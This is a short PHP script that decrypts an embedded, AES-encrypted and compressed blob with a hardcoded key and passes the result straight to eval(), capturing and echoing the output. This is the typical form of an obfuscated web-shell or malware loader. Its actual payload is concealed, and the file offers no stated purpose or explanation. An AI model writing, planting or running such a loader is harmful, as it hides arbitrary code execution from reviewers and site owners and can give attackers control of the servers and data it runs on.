<?php
ob_start();
$data = 'YzZhOTY3NDQ2NmNmNzM5NmE5ZDg0MDk3NDZhYjI4YmOu2DMNYFJ+yOLNvttj+v0HWUxlNUFWTGd2b1ZaNkhiczhJZlIzd1lGUnVTQ3daL01XQXh3KzFKcFpVMUd0OGQ1aXUwS0tsRDBwZlM5SW5nYzArNWFYUDZ5SUpYVk01T0RPM3U4MGpZWFFJSmplOHlSVno4S2lQeEdHU2hVSWZhOHV2YzVoai9uc1FVSUZmZmlQeThtVWZ0Z0VnUTFCNUxlbUxJOUtwSjBvTnpiaytUUWdxczJWYUJYWi9ZPQ==';
$decodedData = base64_decode($data);
$salt = substr($decodedData, 0, 32);
$iv = substr($decodedData, 32, 16);
$encryptedData = substr($decodedData, 48);
$key = '+f0oEvs0oLb5KhM50vqXKIvl/KtheoO9fXewq4jtNMc=';
$decryptedData = openssl_decrypt($encryptedData, 'AES-256-CBC', $key, 0, $iv);
eval(gzuncompress(base64_decode($decryptedData)));
$output = ob_get_contents();
ob_end_clean();
echo $output;
?>